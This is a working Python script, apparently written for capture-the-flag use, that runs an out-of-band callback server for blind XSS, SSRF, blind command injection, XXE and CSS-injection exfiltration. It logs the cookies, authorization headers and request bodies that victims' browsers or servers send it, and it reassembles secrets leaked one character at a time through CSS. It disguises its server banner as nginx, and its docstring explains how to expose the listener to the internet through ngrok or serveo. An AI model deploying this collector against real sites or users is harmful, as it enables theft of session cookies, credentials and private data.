#!/usr/bin/env python3
"""
collector.py — out-of-band callback catcher.

THE tool for blind/OOB attacks: CSS injection exfil, blind XSS, SSRF, blind
command injection, XXE OOB, DNS-ish HTTP callbacks. Anything that "phones home"
lands here with full detail, logged to console and to a file.

  python3 collector.py                 # listen on 0.0.0.0:8000
  python3 collector.py -p 9001         # custom port
  python3 collector.py --css           # also auto-reassemble CSS-exfil leaks

Then point the target at  http://YOUR_IP:PORT/...  and watch.

To be reachable from a remote challenge, expose it:
  - same network: use your VPN/box IP
  - internet: `ngrok http 8000`  or  `ssh -R 80:localhost:8000 serveo.net`
"""
import argparse, datetime, sys, threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs

LOGFILE = "collector.log"
css_state = {}   # order-preserving reconstruction of char-by-char leaks
lock = threading.Lock()

def log(msg):
    line = f"{datetime.datetime.now().isoformat(timespec='seconds')} {msg}"
    print(line, flush=True)
    with lock:
        with open(LOGFILE, "a") as f:
            f.write(line + "\n")

class H(BaseHTTPRequestHandler):
    server_version = "nginx"      # look boring
    def _handle(self, method):
        u = urlparse(self.path)
        qs = parse_qs(u.query)
        length = int(self.headers.get("Content-Length", 0) or 0)
        body = self.rfile.read(length) if length else b""
        peer = self.client_address[0]

        log("=" * 70)
        log(f"[{method}] from {peer}  path={u.path}")
        if qs:   log(f"  query  : {qs}")
        if body: log(f"  body   : {body[:2000]!r}")
        interesting = {k: v for k, v in self.headers.items()
                       if k.lower() in ("user-agent","referer","cookie",
                                        "x-forwarded-for","authorization","host")}
        for k, v in interesting.items():
            log(f"  {k}: {v}")

        # CSS-exfil reassembly: common pattern is /leak?c=<char>&i=<index>
        # or path like /leak/<index>/<char>. Adapt to your payload.
        if self.server.css_mode:
            self._css_reassemble(u.path, qs)

        # respond with a 1x1 gif so <img>/background-image is happy
        self.send_response(200)
        self.send_header("Content-Type", "image/gif")
        self.send_header("Content-Length", "0")
        self.end_headers()

    def _css_reassemble(self, path, qs):
        idx = char = None
        if "c" in qs:
            char = qs["c"][0]
            idx = int(qs["i"][0]) if "i" in qs else len(css_state)
        else:
            parts = [p for p in path.strip("/").split("/") if p]
            # /leak/<char>  or  /<char>
            if parts:
                char = parts[-1]
                idx = len(css_state)
        if char is not None:
            css_state[idx] = char
            recon = "".join(css_state[k] for k in sorted(css_state))
            log(f"  >> CSS leak so far: {recon!r}")

    def do_GET(self):  self._handle("GET")
    def do_POST(self): self._handle("POST")
    def do_PUT(self):  self._handle("PUT")
    def log_message(self, *a): pass   # silence default logging

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-p", "--port", type=int, default=8000)
    ap.add_argument("-b", "--bind", default="0.0.0.0")
    ap.add_argument("--css", action="store_true", help="auto-reassemble CSS-exfil leaks")
    a = ap.parse_args()
    srv = ThreadingHTTPServer((a.bind, a.port), H)
    srv.css_mode = a.css
    log(f"[*] collector listening on http://{a.bind}:{a.port}  (log -> {LOGFILE})")
    if a.css: log("[*] CSS reassembly ON (expects /leak?c=X&i=N or /leak/<char>)")
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        log("[*] bye")

if __name__ == "__main__":
    main()
